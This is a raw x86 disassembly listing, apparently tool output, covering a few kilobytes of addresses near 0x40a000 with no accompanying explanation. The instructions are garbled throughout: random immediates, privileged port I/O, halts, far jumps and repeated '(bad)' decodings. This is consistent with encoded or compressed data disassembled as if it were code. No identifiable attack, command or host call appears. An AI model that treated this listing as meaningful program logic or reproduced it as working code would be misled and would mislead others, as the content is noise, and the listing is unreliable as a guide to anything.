  409dfe:	and    eax,0x5c503e6
  409e03:	add    BYTE PTR [ebp+0x55],0xca
  409e07:	vshufpd xmm7,xmm1,XMMWORD PTR [eax-0x3b],0xda
  409e0d:	pop    edi
  409e0e:	mov    al,0x71
  409e10:	dec    esp
  409e11:	js     0x409e8d
  409e13:	cmp    al,BYTE PTR ds:0x6e250594
  409e19:	or     DWORD PTR [ecx-0x62241ce0],0xff00de7a
  409e23:	sub    BYTE PTR [edx-0x2fdad22a],cl
  409e29:	std    
  409e2a:	cld    
  409e2b:	dec    ecx
  409e2c:	nop
  409e2d:	push   esi
  409e2e:	pop    esp
  409e2f:	sahf   
  409e30:	mov    eax,ds:0xfa5ff6ff
  409e35:	fwait
  409e36:	dec    edx
  409e37:	retf   
  409e38:	jae    0x409de5
  409e3a:	or     DWORD PTR [edi+0x35],edx
  409e3d:	mov    dh,0xea
  409e3f:	xor    al,0x19
  409e41:	into   
  409e42:	mov    BYTE PTR ds:0x7e1dc68c,dl
  409e48:	jae    0x409e66
  409e4a:	xchg   ebx,eax
  409e4b:	fs push si
  409e4e:	jne    0x409e4f
  409e50:	mov    ecx,0x337b707a
  409e55:	and    eax,0x60cc583e
  409e5a:	cli    
  409e5b:	jns    0x409eac
  409e5d:	pop    edi
  409e5e:	pop    edx
  409e5f:	mov    ebx,DWORD PTR [edi-0x5f3e2105]
  409e65:	jno    0x409e51
  409e67:	idiv   DWORD PTR [ecx+eiz*4+0x4617cbb0]
  409e6e:	push   esi
  409e6f:	xor    esp,esp
  409e71:	sbb    edi,DWORD PTR [edx-0x15aeafe]
  409e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e78:	mov    gs,ebx
  409e7a:	in     eax,dx
  409e7b:	adc    esp,DWORD PTR [edi-0x3e2ac60e]
  409e81:	sahf   
  409e82:	sar    BYTE PTR [esi-0x3c],0x67
  409e86:	xor    DWORD PTR [edx+eiz*2-0x185c0466],esp
  409e8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e8e:	loope  0x409e11
  409e90:	cmp    bl,BYTE PTR [eax+0x39]
  409e93:	hlt    
  409e94:	mov    BYTE PTR [edi+0x3897cc9b],ah
  409e9a:	pop    eax
  409e9b:	push   edi
  409e9c:	hlt    
  409e9d:	fisttp WORD PTR [edi+0x5c88a7a3]
  409ea3:	cmc    
  409ea4:	scas   al,BYTE PTR es:[edi]
  409ea5:	mov    dl,0x76
  409ea7:	cmp    ebp,DWORD PTR [eax]
  409ea9:	aad    0x75
  409eab:	stc    
  409eac:	dec    edx
  409ead:	loope  0x409ebb
  409eaf:	add    BYTE PTR [ebx+0x68140922],0xd8
  409eb6:	xchg   edx,eax
  409eb7:	dec    ebp
  409eb8:	mov    al,ds:0xa3a484cd
  409ebd:	lock outs dx,BYTE PTR ds:[esi]
  409ebf:	arpl   WORD PTR [edx],sp
  409ec1:	imul   edi,DWORD PTR [edi-0x18259b7b],0x57e1bbf7
  409ecb:	mov    ebp,0xe2bff1de
  409ed0:	sub    esi,DWORD PTR [esi]
  409ed2:	jne    0x409f50
  409ed4:	test   eax,0x17db26f2
  409ed9:	or     BYTE PTR [ebp-0x31],0x52
  409edd:	test   al,0x64
  409edf:	inc    ecx
  409ee0:	dec    esp
  409ee1:	sub    al,0xd2
  409ee3:	stos   DWORD PTR es:[edi],eax
  409ee4:	pop    ecx
  409ee5:	inc    esi
  409ee6:	out    dx,eax
  409ee7:	jb     0x409ed3
  409ee9:	pop    ss
  409eea:	stos   BYTE PTR es:[edi],al
  409eeb:	jmp    0x409ed4
  409eed:	sub    ecx,DWORD PTR [edi]
  409eef:	xor    ah,BYTE PTR [edx-0x54]
  409ef2:	outs   dx,DWORD PTR ds:[esi]
  409ef3:	sbb    BYTE PTR [ebx+0x72],ah
  409ef6:	or     eax,0xa99262f0
  409efb:	sub    al,BYTE PTR [ecx]
  409efd:	push   es
  409efe:	ffreep st(4)
  409f00:	fwait
  409f01:	add    eax,0x10dc8ad2
  409f06:	ret    0xf68f
  409f09:	or     al,BYTE PTR [eax+esi*8]
  409f0c:	adc    dh,BYTE PTR [eax+0x4b]
  409f0f:	lods   al,BYTE PTR ds:[esi]
  409f10:	fidiv  WORD PTR [ebp+0x7a]
  409f13:	aas    
  409f14:	ficom  DWORD PTR [ebx+ebx*2+0x52]
  409f18:	adc    DWORD PTR [esi+0x48],0xffffffe1
  409f1c:	loope  0x409eb5
  409f1e:	pushf  
  409f1f:	mov    eax,0x79a092bd
  409f24:	xchg   ebp,eax
  409f25:	sub    al,0x47
  409f27:	and    ch,al
  409f29:	mov    bl,0x8c
  409f2b:	ins    BYTE PTR es:[edi],dx
  409f2c:	loop   0x409ebf
  409f2e:	pop    edx
  409f2f:	inc    esi
  409f30:	inc    edx
  409f31:	stc    
  409f32:	sbb    al,0xf3
  409f34:	pop    ecx
  409f35:	mov    dh,0xfb
  409f37:	aaa    
  409f38:	inc    edi
  409f39:	adc    bl,cl
  409f3b:	loope  0x409f78
  409f3d:	rcl    BYTE PTR [eax],0xb6
  409f40:	ror    eax,1
  409f42:	jecxz  0x409ee0
  409f44:	cwde   
  409f45:	mov    ah,0x27
  409f47:	and    eax,DWORD PTR [esi-0x4c304473]
  409f4d:	stos   DWORD PTR es:[edi],eax
  409f4e:	(bad)  [ecx]
  409f50:	push   0x14
  409f52:	repnz xchg edi,eax
  409f54:	lods   eax,DWORD PTR ds:[esi]
  409f55:	call   DWORD PTR [ebx+0x1]
  409f58:	sbb    eax,0xca8c83c
  409f5d:	retf   
  409f5e:	xchg   edx,eax
  409f5f:	mov    esi,0xcd8894d9
  409f64:	pop    ebp
  409f65:	jp     0x409fb3
  409f67:	int    0x4d
  409f69:	xor    al,0x92
  409f6b:	or     esp,DWORD PTR [edx-0x195297f1]
  409f71:	push   0xf315152a
  409f76:	cmc    
  409f77:	test   DWORD PTR [esi],0x65d8152a
  409f7d:	jb     0x409f14
  409f7f:	out    0x1,al
  409f81:	(bad)  
  409f82:	push   ecx
  409f83:	adc    eax,0xb379636d
  409f88:	stc    
  409f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f8a:	ret    0x7e4f
  409f8d:	sub    al,0x51
  409f8f:	ja     0x40a00f
  409f91:	in     al,dx
  409f92:	jmp    0x52a5:0x434ff5a4
  409f99:	sar    DWORD PTR [edx+0x39],0xc2
  409f9d:	mov    bl,ch
  409f9f:	pop    ebx
  409fa0:	jno    0x409f96
  409fa2:	shl    BYTE PTR [ecx-0x6fb71284],cl
  409fa8:	xchg   esp,eax
  409fa9:	seto   BYTE PTR [ebp+0x59]
  409fad:	cmc    
  409fae:	adc    DWORD PTR ds:0x2fe5987a,edi
  409fb4:	ret    0x4a92
  409fb7:	repz xor esi,DWORD PTR [edi+0x160ba0f8]
  409fbe:	cmp    al,0x27
  409fc0:	and    al,0x33
  409fc2:	sub    eax,0xff8b0509
  409fc7:	jo     0x409fd8
  409fc9:	aaa    
  409fca:	pop    esi
  409fcb:	push   ss
  409fcc:	mov    cl,0x6b
  409fce:	mov    ds:0x94b3f7b5,al
  409fd3:	ins    BYTE PTR es:[edi],dx
  409fd4:	pusha  
  409fd5:	ror    eax,cl
  409fd7:	leave  
  409fd8:	bound  eax,QWORD PTR [ebp-0x4f55ea3e]
  409fde:	mov    cl,0x93
  409fe0:	mov    ah,0x6e
  409fe2:	(bad)  
  409fe3:	sub    bl,BYTE PTR [edx+0x5e78f9f5]
  409fe9:	mov    ecx,0xb80ae172
  409fee:	adc    edi,edx
  409ff0:	cli    
  409ff1:	sbb    cl,BYTE PTR [ebx-0x4f0acabe]
  409ff7:	(bad)  
  409ff8:	sbb    al,0x3c
  409ffa:	dec    edi
  409ffb:	xchg   DWORD PTR [ebx+0x59dec855],ebp
  40a001:	aaa    
  40a002:	inc    esp
  40a003:	test   DWORD PTR [esi+ebx*4],esp
  40a006:	cdq    
  40a007:	pop    edi
  40a008:	sbb    ch,bh
  40a00a:	mov    ?,esi
  40a00c:	jnp    0x40a012
  40a00e:	or     esp,DWORD PTR [eax-0x6f6cd0d2]
  40a014:	xchg   ecx,eax
  40a015:	sbb    bh,bl
  40a017:	out    0x2c,al
  40a019:	out    dx,eax
  40a01a:	enter  0x5673,0x6
  40a01e:	or     al,0x53
  40a020:	mov    edi,0xa63b48d2
  40a025:	xor    DWORD PTR [ecx],edx
  40a027:	ret    
  40a028:	jmp    0x76c93177
  40a02d:	jnp    0x409fb7
  40a02f:	and    edx,esp
  40a031:	dec    esp
  40a032:	inc    eax
  40a033:	pop    eax
  40a034:	repz dec ecx
  40a036:	hlt    
  40a037:	adc    BYTE PTR [eax-0x3daaa8b8],ch
  40a03d:	dec    esi
  40a03e:	dec    ebx
  40a03f:	(bad)  
  40a040:	xchg   ecx,eax
  40a041:	dec    edx
  40a042:	in     al,dx
  40a043:	lods   eax,DWORD PTR ds:[esi]
  40a044:	test   eax,0x86c65bf4
  40a049:	les    ebx,FWORD PTR [edx-0x2d]
  40a04c:	fadd   st(7),st
  40a04e:	adc    DWORD PTR [esi],esi
  40a050:	dec    edx
  40a051:	movzx  ebx,cx
  40a054:	mov    eax,ds:0xa60437df
  40a059:	in     eax,dx
  40a05a:	jge    0x40a086
  40a05c:	dec    edx
  40a05d:	xchg   edi,eax
  40a05e:	xchg   edx,eax
  40a05f:	inc    edx
  40a060:	xchg   BYTE PTR fs:[edx],dl
  40a063:	mov    dh,BYTE PTR [edx]
  40a065:	sbb    BYTE PTR [edx-0xc],0x4f
  40a069:	gs (bad) 
  40a06b:	mov    eax,0x86ada691
  40a070:	imul   edx,DWORD PTR [ebx+0x9],0xffffff94
  40a074:	fwait
  40a075:	push   ebx
  40a076:	mov    edi,0xc2fd3f9e
  40a07b:	mov    ah,0x1c
  40a07d:	cli    
  40a07e:	fstp   QWORD PTR [ebx-0x1f933fa]
  40a084:	jnp    0x40a0b9
  40a086:	retf   0xc5b5
  40a089:	in     eax,dx
  40a08a:	mov    bh,0x52
  40a08c:	imul   ecx,DWORD PTR [ebp-0xf],0x6196b83e
  40a093:	and    ebx,DWORD PTR [eax-0x32]
  40a096:	sub    ah,ah
  40a098:	add    dl,BYTE PTR cs:[ebx+0x6f204e40]
  40a09f:	mov    ch,0xed
  40a0a1:	add    eax,ebx
  40a0a3:	sub    DWORD PTR [edi*1+0x5475a985],0xf
  40a0ab:	and    al,BYTE PTR ds:0x2405e72a
  40a0b1:	mov    dl,0x68
  40a0b3:	or     WORD PTR [eax+0x75],sp
  40a0b7:	aam    0x96
  40a0b9:	sub    BYTE PTR [ebp+0x4dea8128],dl
  40a0bf:	icebp  
  40a0c0:	test   DWORD PTR [ebx],esi
  40a0c2:	push   edi
  40a0c3:	sbb    eax,0x42890ffd
  40a0c8:	nop
  40a0c9:	addr16 lock inc esi
  40a0cc:	aam    0xb5
  40a0ce:	inc    ecx
  40a0cf:	pop    ebx
  40a0d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0d1:	dec    esi
  40a0d2:	dec    esi
  40a0d3:	jnp    0x40a0da
  40a0d5:	arpl   cx,di
  40a0d7:	nop
  40a0d8:	leave  
  40a0d9:	add    BYTE PTR [eax-0xa],bl
  40a0dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0dd:	sub    esp,DWORD PTR [edx-0x1261c9f0]
  40a0e3:	add    BYTE PTR [edx],dl
  40a0e5:	adc    DWORD PTR [edx],ebx
  40a0e7:	jnp    0x40a120
  40a0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ea:	aaa    
  40a0eb:	ret    
  40a0ec:	mov    BYTE PTR [ecx-0x344060b3],ch
  40a0f2:	inc    esi
  40a0f3:	outs   dx,BYTE PTR ds:[esi]
  40a0f4:	idiv   DWORD PTR [eax-0x2d60dec1]
  40a0fa:	xchg   ebx,eax
  40a0fb:	pop    ss
  40a0fc:	xor    esp,DWORD PTR [esi]
  40a0fe:	inc    esp
  40a0ff:	lods   al,BYTE PTR ds:[esi]
  40a100:	mov    DWORD PTR [esi],eax
  40a102:	(bad)  
  40a104:	push   ebp
  40a105:	inc    esi
  40a106:	dec    esi
  40a107:	out    dx,al
  40a108:	shr    BYTE PTR [eax+0x454d19e2],1
  40a10e:	jae    0x40a097
  40a110:	mov    al,ds:0x6da7c9f1
  40a115:	jl     0x40a0df
  40a117:	pop    ebp
  40a118:	inc    esp
  40a119:	xlat   BYTE PTR ds:[ebx]
  40a11a:	into   
  40a11b:	fadd   st(0),st
  40a11d:	xor    al,dh
  40a11f:	mov    ch,0xbb
  40a121:	mov    al,ds:0x98022097
  40a126:	enter  0x5b98,0x38
  40a12a:	xchg   edi,eax
  40a12b:	jae    0x40a11b
  40a12d:	gs ret 0xd032
  40a131:	adc    esi,ecx
  40a133:	cs or  al,0x7a
  40a136:	mov    al,0xf0
  40a138:	mov    gs,ebx
  40a13a:	ror    DWORD PTR [edi],cl
  40a13c:	lahf   
  40a13d:	jl     0x40a13b
  40a13f:	or     ah,BYTE PTR [ebp-0x35]
  40a142:	pop    ebp
  40a143:	xchg   BYTE PTR [edx],bh
  40a145:	loope  0x40a0df
  40a147:	out    dx,al
  40a148:	add    BYTE PTR [edi-0x77c13ceb],ch
  40a14e:	mov    esp,0x9c7cea50
  40a153:	xor    eax,0x303be05a
  40a158:	mov    dl,0xc4
  40a15a:	(bad)  
  40a15b:	dec    DWORD PTR [eax]
  40a15d:	dec    BYTE PTR [ebx+0x2d98e3b2]
  40a163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a164:	jmp    0xb11c4e6a
  40a169:	aas    
  40a16a:	sub    al,0xb1
  40a16c:	sbb    ebx,DWORD PTR [eax+eax*2+0x59]
  40a170:	hlt    
  40a171:	pushf  
  40a172:	add    eax,0x62e0cd85
  40a177:	push   ss
  40a178:	fnsave [ecx]
  40a17a:	popf   
  40a17b:	pop    esp
  40a17c:	sbb    al,BYTE PTR [esi-0x1525ab1c]
  40a182:	aaa    
  40a183:	test   esi,0x2ef3752d
  40a189:	sbb    edi,edi
  40a18b:	xor    al,0x36
  40a18d:	mov    gs,WORD PTR [eax+0x3a61840e]
  40a193:	fs sub al,0xbe
  40a196:	cmc    
  40a197:	pop    ebp
  40a198:	or     DWORD PTR [ebx],ebp
  40a19a:	or     al,0x3e
  40a19c:	test   al,0xad
  40a19e:	xor    al,0x52
  40a1a0:	mov    DWORD PTR ds:0xb702801d,esi
  40a1a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1a8:	out    0xd4,eax
  40a1aa:	stos   BYTE PTR es:[edi],al
  40a1ab:	fiadd  DWORD PTR ds:0x930e8d71
  40a1b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1b2:	mov    ebx,0x7fcdc601
  40a1b7:	push   edi
  40a1b8:	pop    ss
  40a1b9:	pop    ds
  40a1ba:	or     eax,0x5ac5f8dc
  40a1bf:	mov    ah,0xc5
  40a1c1:	xchg   ebp,eax
  40a1c2:	push   eax
  40a1c3:	daa    
  40a1c4:	aad    0x75
  40a1c6:	lods   al,BYTE PTR ds:[esi]
  40a1c7:	in     al,0x4e
  40a1c9:	cmp    BYTE PTR [eax+0x70f50024],0x63
  40a1d0:	das    
  40a1d1:	ins    BYTE PTR es:[edi],dx
  40a1d2:	mov    edx,0xcf9a2250
  40a1d7:	in     al,dx
  40a1d8:	nop
  40a1d9:	xor    eax,0x538fb9d7
  40a1de:	sbb    eax,0xad3a401f
  40a1e3:	xchg   ecx,eax
  40a1e4:	das    
  40a1e5:	add    eax,0x93803a8b
  40a1ea:	dec    esp
  40a1eb:	pop    esp
  40a1ec:	rol    esi,cl
  40a1ee:	mov    dh,0xaa
  40a1f0:	fnstsw WORD PTR [esi]
  40a1f2:	hlt    
  40a1f3:	cmp    al,0xb0
  40a1f5:	xlat   BYTE PTR ds:[ebx]
  40a1f6:	int    0x26
  40a1f8:	push   cs
  40a1f9:	lods   al,BYTE PTR ds:[esi]
  40a1fa:	imul   eax,DWORD PTR [edx-0x25],0x67
  40a1fe:	xchg   BYTE PTR [ebx],al
  40a200:	fcomp  DWORD PTR [esi+0x423b47b7]
  40a206:	in     eax,dx
  40a207:	mov    dh,0xf3
  40a209:	rcl    dl,1
  40a20b:	and    al,0xad
  40a20d:	pop    esi
  40a20e:	mov    ds:0x8b774b1b,al
  40a213:	das    
  40a214:	out    0xe0,eax
  40a216:	xchg   BYTE PTR [edi],bl
  40a218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a219:	and    eax,0x75b7b734
  40a21e:	jl     0x40a1a2
  40a220:	mov    cl,BYTE PTR [ebp+0x70]
  40a223:	mov    ebp,DWORD PTR [edx-0x54]
  40a226:	test   eax,0xc617f6a9
  40a22b:	dec    eax
  40a22c:	scas   eax,DWORD PTR es:[edi]
  40a22d:	out    dx,al
  40a22e:	jmp    0x40a235
  40a230:	push   esi
  40a231:	fadd   st(0),st
  40a233:	push   esp
  40a234:	mov    ch,0x52
  40a236:	std    
  40a237:	loop   0x40a24e
  40a239:	cmp    BYTE PTR [esi],bl
  40a23b:	sbb    BYTE PTR [eax-0x3c85e6d4],ah
  40a241:	xchg   esp,eax
  40a242:	mov    ds:0x158dca09,al
  40a247:	mov    al,ds:0x5cc2b8cb
  40a24c:	sbb    al,0x7f
  40a24e:	int3   
  40a24f:	sti    
  40a250:	sti    
  40a251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a252:	jl     0x40a289
  40a254:	imul   esi,esi,0xcf39674
  40a25a:	jp     0x40a247
  40a25c:	jo     0x40a2b3
  40a25e:	idiv   BYTE PTR [ecx-0x742b3153]
  40a264:	add    al,0xd2
  40a266:	test   eax,0xf4dbd73c
  40a26b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a26c:	das    
  40a26d:	xchg   edi,eax
  40a26e:	outs   dx,DWORD PTR ds:[esi]
  40a26f:	inc    ebp
  40a270:	xchg   ebx,eax
  40a271:	imul   DWORD PTR [eax]
  40a273:	and    eax,0x4c44922e
  40a278:	jp     0x40a26b
  40a27a:	cmp    BYTE PTR [edi+0x4a289a39],bl
  40a280:	add    al,0x66
  40a282:	cmp    BYTE PTR [edi],dl
  40a284:	sub    DWORD PTR [edi],ebp
  40a286:	jno    0x40a215
  40a288:	adc    al,0x2f
  40a28a:	test   al,0x6e
  40a28c:	js     0x40a2e0
  40a28e:	push   cs
  40a28f:	inc    eax
  40a290:	inc    esi
  40a291:	arpl   WORD PTR [eax-0x423db470],ax
  40a297:	cli    
  40a298:	push   ss
  40a299:	dec    esi
  40a29a:	daa    
  40a29b:	mov    esi,0x90dc3b8e
  40a2a0:	cdq    
  40a2a1:	mov    ecx,0x50c243e5
  40a2a6:	mov    ebx,DWORD PTR [ebp-0x37c47e4]
  40a2ac:	gs inc edi
  40a2ae:	sahf   
  40a2af:	or     DWORD PTR [edi],esi
  40a2b1:	clflush BYTE PTR [edx+0x64]
  40a2b5:	dec    edx
  40a2b6:	jecxz  0x40a2bd
  40a2b8:	ror    DWORD PTR [edi+0x704a4435],1
  40a2be:	test   al,0xed
  40a2c0:	scas   eax,DWORD PTR es:[edi]
  40a2c1:	inc    esi
  40a2c2:	out    0x93,eax
  40a2c4:	adc    eax,0x3e226e43
  40a2c9:	add    bh,cl
  40a2cb:	ret    
  40a2cc:	pop    esp
  40a2cd:	in     eax,0xb0
  40a2cf:	jne    0x40a330
  40a2d1:	jb     0x40a316
  40a2d3:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2d5:	mov    ebx,0x5ce82717
  40a2da:	retf   
  40a2db:	mov    dh,0xdf
  40a2dd:	aad    0x97
  40a2df:	ins    DWORD PTR es:[edi],dx
  40a2e0:	loopne 0x40a2d1
  40a2e2:	sbb    eax,ebx
  40a2e4:	lock xchg esi,eax
  40a2e6:	test   al,0xe0
  40a2e8:	(bad)  
  40a2e9:	push   edx
  40a2ea:	adc    ebp,ecx
  40a2ec:	dec    esp
  40a2ed:	jmp    0xc3e9:0x187255c9
  40a2f4:	dec    esi
  40a2f5:	daa    
  40a2f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2f7:	mov    ds:0x3ee68fe7,al
  40a2fc:	pop    eax
  40a2fd:	pop    ecx
  40a2fe:	adc    BYTE PTR [eax+0xa],ah
  40a301:	scas   al,BYTE PTR es:[edi]
  40a302:	das    
  40a303:	nop
  40a304:	ins    DWORD PTR es:[edi],dx
  40a305:	and    ebp,esi
  40a307:	fisttp DWORD PTR cs:[ebp+0x6c1ac46d]
  40a30e:	dec    ebp
  40a30f:	fild   WORD PTR [esi+0x629cdd38]
  40a315:	sbb    eax,0x429d0bc6
  40a31a:	xchg   DWORD PTR [ebx+0x50a62921],ebx
  40a320:	jno    0x40a2c9
  40a322:	loop   0x40a2b9
  40a324:	xor    edx,DWORD PTR [edi+ebp*4-0x40]
  40a328:	inc    edi
  40a329:	fisttp WORD PTR [edx+ecx*1+0x79]
  40a32d:	clc    
  40a32e:	mov    ch,0x3f
  40a330:	pop    edi
  40a331:	stos   DWORD PTR es:[edi],eax
  40a332:	sub    esi,DWORD PTR [ecx]
  40a334:	cmp    ch,BYTE PTR [ebp+0x4cea8a11]
  40a33a:	jo     0x40a3ba
  40a33c:	arpl   WORD PTR [esp+ebp*8+0x60],dx
  40a340:	add    eax,0x79b76360
  40a345:	adc    eax,edi
  40a347:	inc    eax
  40a348:	jns    0x40a382
  40a34a:	push   0x9ffcc186
  40a34f:	loop   0x40a2ee
  40a351:	push   ecx
  40a352:	mov    ?,WORD PTR gs:[ecx+0x9]
  40a356:	mov    esp,0xb5193d91
  40a35b:	adc    ebp,ebx
  40a35d:	add    DWORD PTR [eax+0x5fc30037],ecx
  40a363:	(bad)  
  40a365:	scas   eax,DWORD PTR es:[edi]
  40a366:	pop    ebx
  40a367:	and    BYTE PTR [edi],bl
  40a369:	mov    ds:0x5f83a050,eax
  40a36e:	or     eax,0x709af515
  40a373:	or     DWORD PTR [ebx+ebp*2-0x3d76708c],0x36c5adf5
  40a37e:	in     eax,dx
  40a37f:	push   ss
  40a380:	and    dh,BYTE PTR [edx-0x43]
  40a383:	sbb    DWORD PTR [edi-0x1d994744],edx
  40a389:	sbb    eax,0x530a7932
  40a38e:	jno    0x40a3f9
  40a390:	clc    
  40a391:	arpl   WORD PTR [ebx+0x28bc732a],cx
  40a397:	add    eax,0x6adda02d
  40a39c:	inc    ebp
  40a39d:	inc    esi
  40a39e:	test   eax,0x49778e19
  40a3a3:	xchg   BYTE PTR [eax-0x3addc8fd],bl
  40a3a9:	and    al,0xa1
  40a3ab:	jae    0x40a41e
  40a3ad:	mov    es,WORD PTR [ebx]
  40a3af:	inc    edx
  40a3b0:	jmp    0x793ccd33
  40a3b5:	xchg   edx,eax
  40a3b6:	cmp    BYTE PTR [ecx+0x0],cl
  40a3b9:	xlat   BYTE PTR ds:[ebx]
  40a3ba:	sti    
  40a3bb:	ret    0x4653
  40a3be:	(bad)
  40a3c1:	int3   
  40a3c2:	ret    
  40a3c3:	imul   esi,DWORD PTR [edi-0x4e],0x2945e779
  40a3ca:	imul   esp,DWORD PTR [eax],0x26
  40a3cd:	ror    esi,cl
  40a3cf:	sub    BYTE PTR [esi],ah
  40a3d1:	pop    es
  40a3d2:	ins    DWORD PTR es:[edi],dx
  40a3d3:	imul   eax,DWORD PTR [esi+0x269bc18],0xffffff90
  40a3da:	icebp  
  40a3db:	xchg   esi,eax
  40a3dc:	push   0xffffffbb
  40a3de:	push   eax
  40a3df:	mov    al,ds:0x4300c2ef
  40a3e4:	sti    
  40a3e5:	ffreep st(4)
  40a3e7:	xchg   ecx,eax
  40a3e8:	sbb    dh,bl
  40a3ea:	mov    ebx,0xfac0da82
  40a3ef:	inc    ecx
  40a3f0:	fsub   QWORD PTR [eax]
  40a3f2:	(bad)  
  40a3f3:	and    eax,0x7ac1a964
  40a3f8:	mov    al,0x35
  40a3fa:	aaa    
  40a3fb:	and    BYTE PTR [esi-0x541aa4bf],al
  40a401:	test   al,0x5a
  40a403:	and    BYTE PTR es:[ebp+0x9181d49],0xbb
  40a40b:	pop    es
  40a40c:	adc    ebx,ecx
  40a40e:	test   eax,esi
  40a410:	ret    
  40a411:	lahf   
  40a412:	mov    edi,0x366acdd0
  40a417:	pop    es
  40a418:	mov    ebp,0xc26d7d74
  40a41d:	inc    eax
  40a41e:	push   eax
  40a41f:	jo     0x40a436
  40a421:	sbb    DWORD PTR ss:[ecx+esi*2-0x56d26284],ebx
  40a429:	adc    eax,0x6ed63992
  40a42e:	mov    eax,0xe401b088
  40a433:	push   eax
  40a434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a435:	mov    eax,0x8d940881
  40a43a:	repz push 0xbf18a8fd
  40a440:	stos   DWORD PTR es:[edi],eax
  40a441:	in     al,0x4c
  40a443:	pop    eax
  40a444:	arpl   WORD PTR [esi+edi*8],sp
  40a447:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a448:	sub    BYTE PTR [edi-0x98cbb74],bh
  40a44e:	out    dx,eax
  40a44f:	cld    
  40a450:	jge    0x40a4bc
  40a452:	fcmovnu st,st(5)
  40a454:	inc    ecx
  40a455:	add    BYTE PTR [eax+eax*1],al
  40a458:	mov    eax,0xa1bb2bf3
  40a45d:	xor    BYTE PTR [edi-0x7],al
  40a460:	out    dx,al
  40a461:	sbb    al,BYTE PTR [ebp+esi*4+0x1d9406ab]
  40a468:	and    dh,BYTE PTR [ebx+0x2d7b5a26]
  40a46e:	leave  
  40a46f:	scas   al,BYTE PTR es:[edi]
  40a470:	in     eax,dx
  40a471:	imul   ebx,ecx,0x2d5f512a
  40a477:	aad    0xe7
  40a479:	push   edx
  40a47a:	sub    al,0x40
  40a47c:	enter  0x5500,0x1
  40a480:	(bad)  
  40a482:	mov    ecx,0xdafa860a
  40a487:	in     eax,0xf2
  40a489:	mov    BYTE PTR [esi+0x68],ah
  40a48c:	adc    DWORD PTR [ecx-0x7a],ebx
  40a48f:	push   cs
  40a490:	inc    esp
  40a491:	mov    bh,0x99
  40a493:	repz pushf 
  40a495:	inc    edi
  40a496:	xlat   BYTE PTR ds:[ebx]
  40a497:	mov    ecx,?
  40a499:	add    BYTE PTR [ebp-0x35188198],dl
  40a49f:	out    dx,eax
  40a4a0:	pusha  
  40a4a1:	xchg   BYTE PTR [edx+0x20],ch
  40a4a4:	int    0x92
  40a4a6:	in     eax,dx
  40a4a7:	and    ebp,ecx
  40a4a9:	ds cmp eax,0xdb91182a
  40a4af:	inc    ebx
  40a4b0:	cmp    ah,BYTE PTR [edi]
  40a4b2:	cmp    al,0xa2
  40a4b4:	mov    ebx,0x55aafbca
  40a4b9:	pop    ebp
  40a4ba:	test   DWORD PTR [edx],ebx
  40a4bc:	inc    eax
  40a4bd:	xor    DWORD PTR [ebp+0x22],ecx
  40a4c0:	or     al,0xbf
  40a4c2:	(bad)  
  40a4c3:	and    dh,ah
  40a4c5:	push   ebp
  40a4c6:	jecxz  0x40a51a
  40a4c8:	repz kxnorw k7,k3,k4
  40a4cd:	cmp    eax,0x24ef10db
  40a4d2:	int3   
  40a4d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4d5:	js     0x40a547
  40a4d7:	and    dl,BYTE PTR [ecx]
  40a4d9:	rol    bl,1
  40a4db:	lods   eax,DWORD PTR ds:[esi]
  40a4dc:	mul    DWORD PTR [ecx+eiz*8]
  40a4df:	inc    ecx
  40a4e0:	les    ecx,FWORD PTR [eax+0xc65b7c9]
  40a4e6:	(bad)  
  40a4e7:	cld    
  40a4e8:	enter  0x9eeb,0x4d
  40a4ec:	adc    eax,0x60fb13a5
  40a4f1:	xchg   edi,eax
  40a4f2:	(bad)  
  40a4f3:	addr16 inc edi
  40a4f5:	mov    bh,0x7c
  40a4f7:	out    0x3e,eax
  40a4f9:	push   edi
  40a4fa:	xchg   DWORD PTR [esi+edx*4],eax
  40a4fd:	xchg   DWORD PTR [esp+ebp*1],edx
  40a500:	in     al,0x78
  40a502:	addr16 mov ecx,0xa331b76e
  40a508:	es dec eax
  40a50a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a50b:	mov    cl,0x67
  40a50d:	pop    ds
  40a50e:	arpl   WORD PTR [edi-0x51c05712],ax
  40a514:	push   es
  40a515:	or     dh,BYTE PTR [edi+0x63]
  40a518:	imul   ebx,DWORD PTR [eax+eiz*2],0xffffffe9
  40a51c:	mov    edx,0x6ee511a5
  40a521:	cmc    
  40a522:	push   esp
  40a523:	cmp    al,0x23
  40a525:	cmp    ch,BYTE PTR [edi-0x1ee048e1]
  40a52b:	mov    ebx,0xf2ec42c8
  40a530:	cdq    
  40a531:	add    dh,BYTE PTR [ebx+0x4c]
  40a534:	push   ss
  40a535:	dec    eax
  40a536:	xor    ecx,DWORD PTR [edx+esi*8+0x270a4ae5]
  40a53d:	fisub  WORD PTR [eax+0x63]
  40a540:	retf   0x2c43
  40a543:	sbb    ebx,0x6b00013e
  40a549:	cdq    
  40a54a:	pop    edi
  40a54b:	hlt    
  40a54c:	cmp    al,BYTE PTR [ecx-0x2c]
  40a54f:	iret   
  40a550:	std    
  40a551:	cwde   
  40a552:	xlat   BYTE PTR ds:[ebx]
  40a553:	xor    edi,DWORD PTR [ecx-0x5d]
  40a556:	repz push ecx
  40a558:	daa    
  40a559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a55a:	loope  0x40a4fb
  40a55c:	ds mov ch,0xb
  40a55f:	push   edi
  40a560:	pop    ebp
